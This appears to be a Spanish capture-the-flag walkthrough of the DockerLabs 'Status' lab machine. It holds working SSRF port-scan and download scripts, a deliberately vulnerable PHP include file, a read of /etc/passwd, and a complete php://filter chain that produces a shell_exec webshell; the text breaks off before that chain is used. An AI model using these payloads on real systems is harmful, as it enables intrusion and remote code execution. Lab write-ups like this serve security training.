---
icon: flag
---

# Status DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip status.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh status.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 03:10 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.000097s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Web Bunkeriana
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

Veremos unicamente el puerto `80` en el que aloja una pagina web, si entramos dentro de la misma veremos una pagina normal sin nada interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2407]
/.html                (Status: 403) [Size: 5197]
/status.php           (Status: 403) [Size: 5197]
/.php                 (Status: 403) [Size: 5197]
/.html                (Status: 403) [Size: 5197]
/.php                 (Status: 403) [Size: 5197]
/server-status        (Status: 403) [Size: 5197]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que nos ha encontrado varias cosas interesantes, entre ellas el archivo llamado `/status.php` pero vemos que nos reporta un `403`, por lo que no podremos acceder directamente a el, ya que tendremos el acceso restringido.

Pero igualmente si intentamos acceder a dicho archivo, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 091437.png" alt=""><figcaption></figcaption></figure>

Vemos que es un falso positivo lo que nos dio `Gobuster` si podremos entrar, pero en la propia pagina no nos pone nada interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

Vamos a probar a utilizar `nikto` a ver que nos encuentra.

## Nikto

```shell
nikto -h http://<IP> -C all
```

Info:

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.17.0.2
+ Target Hostname:    172.17.0.2
+ Target Port:        80
+ Start Time:         2025-07-13 03:41:27 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'statusid' found, with contents: 0.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 967, size: 63815bcf67100, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ 26640 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-07-13 03:41:51 (GMT-4) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Vemos algo bastante interesante aqui, el siguiente parametro de la respuesta del servidor en la cabecera de la pagina.

```
+ /: Uncommon header 'statusid' found, with contents: 0.
```

Vamos a comprobar eso que nos reporto `nikto` utilizando `BurpSuite`, vamos abrirlo, lo configuramos para que este en mitad de la comunicacion `cliente-Servidor`, una vez echo eso capturamos la peticion con `BurpSuite` y veremos lo siguiente:

> Peticion Cliente

```
GET /status.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

> Respuesta Servidor

```
HTTP/1.1 403 Forbidden
Date: Sun, 13 Jul 2025 07:43:41 GMT
Server: Apache/2.4.58 (Ubuntu)
Statusid: 0
Content-Length: 5197
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

Vemos que efectivamente contiene en la respuesta el `Statusid` que nos estaba reportando `Nikto`, si probamos a ponerlo en `1` y enviamos la respuesta no va a funcionar directamente ahi, por lo que vamos a probar a modificar la `peticion` del cliente para añadir directamente el `Statusid` con el valor `1` a ver que pasa, quedando algo asi:

> Peticion Cliente Modificada

```
GET /status.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Statusid: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Si lo enviamos nos contestara esto el servidor:

> Respuesta Servidor

```
HTTP/1.1 200 OK
Date: Sun, 13 Jul 2025 07:46:41 GMT
Server: Apache/2.4.58 (Ubuntu)
Statusid: 1
Vary: Accept-Encoding
Content-Length: 304
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<h1>Server Status</h1>
<p>200</p>

<h1>Check Status</h1>
<form method="POST">
    <input type="url" name="url" placeholder="http://example.com" required>
    <button>Send</button>
</form>

<footer style="position: fixed; bottom: 10px; right: 10px; font-size: 0.9em; color: gray;">
    v0.2
</footer>
```

Vemos que el valor se modifico de forma correcta y que el contenido de la web es otra cosa, ha cambiado veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 094738.png" alt=""><figcaption></figcaption></figure>

Vamos a probar a realizar algun `SSRF` por ejemplo, vamos a poner nuestra `IP` junto con un archivo que crearemos, para ver si nos coge desde nuestro servidor de `python3` dicho archivo o hace el intento.

> test.txt

```
Fichero de prueba
```

Abriremos dicho servidor de `python3`.

```shell
python3 -m http.server 80
```

Ahora en el campo de la `URL` vamos a poner lo siguiente:

```
http://<IP_ATTACKER>/test.txt
```

Si le damos a enviar teniendo el `BurpSuite` a la escucha para capturar la peticion, veremos lo siguiente:

```
POST /status.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/status.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F192.168.177.129%2Ftest.txt
```

En esta parte tendremos que volver añadirle el `Statusid: 1` para que funcione y nos vuleva a redirigir a la pagina en la que estamos quedando asi:

```
POST /status.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://172.17.0.2
Statusid: 1
Connection: keep-alive
Referer: http://172.17.0.2/status.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F192.168.177.129%2Ftest.txt
```

Ahora si lo enviamos, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 101025.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado y que obtiene el archivo, a parte de que plasma el contenido en la pagina, si intentamos una `shell` con `PHP` o intentar buscar el archivo si se ha subido al servidor no funcionara nada, pero lo que si funciona es una peticion de archivo de forma interna respecto al servidor, haciendo algo asi.

```
http://127.0.0.1:80/
```

Si ponemos eso y lo enviamos, siguiente todo lo anterior veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 101205.png" alt=""><figcaption></figcaption></figure>

Vemos que efectivamente esta leyendo dicho archivo que esta en dicho puerto, pero si intentamos algo como `file://` no va a funcionar, por lo que hay que seguir investigando el vector de entrada.

Vamos a realizar un escaneo de puerto a nivel interno del servidor, a ver si estuviera alguno de forma interna, por lo que vamos a montarnos un script para ello.

> ssrf\_port.py

```python
import requests
import concurrent.futures

victim_url = "http://<IP_VICTIM>/status.php"
headers = { "Statusid": "1" }

# Detecta si la respuesta parece “normal” para un puerto cerrado
def baseline_response():
    resp = requests.post(victim_url, headers=headers, data={"url": "http://127.0.0.1:9/"}, timeout=5)
    return len(resp.text)

baseline_len = baseline_response()
print(f"[*] Baseline response length: {baseline_len}")

def check_port(port):
    try:
        url = f"http://127.0.0.1:{port}/"
        resp = requests.post(victim_url, headers=headers, data={"url": url}, timeout=5)
        content_len = len(resp.text)

        if content_len != baseline_len:
            print(f"[+] Port {port} OPEN? - Response length: {content_len}")
    except requests.exceptions.Timeout:
        print(f"[-] Port {port} TIMEOUT")
    except requests.exceptions.RequestException:
        pass  # Ignore connection errors (likely closed)

# Usa hilos para mayor velocidad
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    ports = range(1, 65536)
    executor.map(check_port, ports)

print("[*] Scan complete.")
```

Ahora lo ejecutaremos de la siguiente forma:

```shell
python3 ssrf_port.py
```

Info:

```
[*] Baseline response length: 339
[+] Port 80 OPEN? - Response length: 3216
[+] Port 3222 OPEN? - Response length: 650
[*] Scan complete.
```

Vemos que hay un puerto a parte del `80` en el que al parecer puede estar abierto de forma interna, vamos a comprobarlo el `output` desde la web.

```
http://127.0.0.1:3222
```

Si lo enviamos y hacemos todo lo anterior de la cabecera con `BurpSuite`, etc.... Veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 104935.png" alt=""><figcaption></figcaption></figure>

Vemos que si funciona y estamos viendo algo bastante interesante, por lo que vamos a investigar ese `endpoint` que estamos viendo.

Vamos a probar a enviar el `endpoint` de forma local de esta forma:

```
http://127.0.0.1:3222/backups
```

Ahora si lo enviamos, haciendo todo lo anterior veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 105311.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado y nos esta mostrando una `URL` interna a la que vamos acceder poniendolo directamente en el campo de `Check Status`.

```
http://localhost/061400ca5d384de48f37a71ec23cc518/backups/backup_5025a3123660d066c9ba8617c0cd92d5.zip
```

Pero veremos que el `ZIP` nos lo muestra literalmente, por lo que vamos a descargarnoslo de forma directa mediante un script de `python3`.

> ssrf\_saved\_zip.py

```python
import requests

victim_url = "http://<IP_VICTIM>/061400ca5d384de48f37a71ec23cc518/backups/backup_5025a3123660d066c9ba8617c0cd92d5.zip"
headers = {"Statusid": "1"}

resp = requests.get(victim_url, headers=headers, timeout=30)

if resp.status_code == 200:
    with open("backup_direct.zip", "wb") as f:
        f.write(resp.content)
    print("Archivo descargado como backup_direct.zip")
else:
    print(f"Error, status: {resp.status_code}")
```

Ahora lo ejecutaremos de esta forma:

```shell
python3 ssrf_saved_zip.py
```

Info:

```
Archivo descargado como backup_direct.zip
```

Veremos que ha funcionado, por lo que vamos a extraer dicho archivo de esta forma:

```shell
unzip backup_direct.zip
```

Info:

```
Archive:  backup_direct.zip
   creating: backup_5025a3123660d066c9ba8617c0cd92d5/
   creating: backup_5025a3123660d066c9ba8617c0cd92d5/061400ca5d384de48f37a71ec23cc518/
   creating: backup_5025a3123660d066c9ba8617c0cd92d5/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/
   creating: backup_5025a3123660d066c9ba8617c0cd92d5/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/
  inflating: backup_5025a3123660d066c9ba8617c0cd92d5/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/status.php  
  inflating: backup_5025a3123660d066c9ba8617c0cd92d5/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php  
  inflating: backup_5025a3123660d066c9ba8617c0cd92d5/status.php
```

Ahora vamos a investigar la estructura de carpetas que se nos ha descomprimido, para ver si vemos algo interesante.

Si entramos dentro de dicha carpeta descomprimida, veremos esto:

```
total 16
drwxr-xr-x 3 root root 4096 Jun 23 10:06 .
drwxr-xr-x 4 root root 4096 Jul 13 04:57 ..
drwxr-xr-x 3 root root 4096 Jun 23 10:07 061400ca5d384de48f37a71ec23cc518
-rw-r--r-- 1 root root 1876 Jun 23 10:06 status.php
```

Esto nos da una pista de que a nivel de web puede ser que exista esta ruta de carpetas empezando por `061400ca5d384de48f37a71ec23cc518` y lo que continua hasta llegar a esto:

```shell
ls -la 061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/
```

Info:

```
total 16
drwxr-xr-x 2 root root 4096 Jun 23 10:06 .
drwxr-xr-x 3 root root 4096 Jun 23 10:07 ..
-rw-r--r-- 1 root root  128 Jun 23 10:06 file.php
-rw-r--r-- 1 root root 2506 Jun 23 10:06 status.php
```

Vamos a probar a meternos en el archivo `status.php` desde esa ruta de carpetas, pero antes vamos a leer que contiene los 2 archivos:

> file.php

```php
<?php 
if($_SERVER['REQUEST_METHOD'] === 'GET'){
    $file = $_GET['72e22dffd7fa10883a85aa3e0bbbd6d4'];
    include($file);
}
?>
```

> status.php

```php
<?php 
session_start();

$status_url = '';
$status = '';
$source_code = '';

$advanceMode = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['advanceMode'])) {
        $advanceMode = $_POST['advanceMode'];
        $_SESSION['advanceMode'] = $advanceMode;
    }
    
    if (isset($_POST['url'])) {
        $url = $_POST['url'];
        if (filter_var($url, FILTER_VALIDATE_URL)) {
            $status_url = get_http_status_code($url, $source_code);
        } else {
            $status = "Enter a valid URL!";
        }
    }
} else {
    if (isset($_SESSION['advanceMode'])) {
        $advanceMode = $_SESSION['advanceMode'];
    }
}

function get_http_status_code($url, &$html = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $parts = explode("\r\n\r\n", $response, 2);
    if (isset($parts[1])) {
        $html = $parts[1];
    } else {
        $html = '';
    }

    return $http_code;
}

$local_status = get_http_status_code("http://localhost:80");

?>

<h1>Server Status</h1>
<p><?php echo htmlspecialchars($local_status); ?></p>

<h1>Check Status</h1>
<form method="POST">
    <input type="url" name="url" placeholder="http://example.com" required>
    
    <label for="advanceMode">Advance Mode:</label>
    <select name="advanceMode" id="advanceMode">
        <option value="true" <?php if($advanceMode) echo 'selected'; ?>>True</option>
        <option value="false" <?php if(!$advanceMode) echo 'selected'; ?>>False</option>
    </select>

    <button>Send</button>
</form>

<?php if ($status_url !== ''): ?>
    <p>HTTP Status: <?php echo htmlspecialchars($status_url); ?></p>
    
    <?php if ($advanceMode && $status_url == 200): ?>
        <details>
            <summary style="cursor: pointer;">Show Output</summary>
            <pre style="white-space: pre-wrap; word-wrap: break-word;"><?php echo htmlspecialchars($source_code); ?></pre>
        </details>
    <?php endif; ?>
<?php endif; ?>

<?php if ($status !== ''): ?>
    <p style="color: red;"><?php echo htmlspecialchars($status); ?></p>
<?php endif; ?>

<footer style="position: fixed; bottom: 10px; right: 10px; font-size: 0.9em; color: gray;">
    v0.1
</footer>
```

Vemos que en el `file.php` con dicho parametro podremos leer archivo o eso parece, y en el `status.php` es la `v1` osea una version mas antigua del primer archivo `status.php` al que entramos, vamos a comprobar si entramos en el `status.php` de `v1`.

```
URL = http://<IP_VICTIM>/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/status.php
```

Una vez que entremos con `BurpSuite` añadiremos el `Statusid: 1` para que funcione como lo haciamos antes y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-13 111246.png" alt=""><figcaption></figcaption></figure>

Vemos que efectivamente cambian cosas y que es la `v1` por lo que estamos accediendo de forma correcta a los archivos, ahora vamos a probar con el `file.php` de esta forma:

```
URL = http://<IP_VICTIM>/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?72e22dffd7fa10883a85aa3e0bbbd6d4=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
baluton:x:1001:1001:baluton,,,:/home/baluton:/bin/bash
_galera:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MariaDB Server,,,:/nonexistent:/bin/false
redghost:x:1002:1002:redghost,,,:/home/redghost:/bin/bash
```

Vemos que esta funcionando, por lo que vamos a probar a utilizar `wrappers` en `PHP` para ejecutar comandos de forma remota (`RCE`).

## Escalate user www-data

### LFI / RFI usando wrappers

Vamos a utilizar una herramienta de `GitHub` que nos automatiza el proceso de codificar el `payload` que vamos a injectar en la `URL`.

URL = https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit/blob/main/filters\_chain\_oracle\_exploit.py

Vamos a crear un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, tendremos que ejecutarlo de esta forma:

```shell
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Info:

```
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Copiaremos todo a partir de `php://...` y la `URL` nos quedara algo como:

```
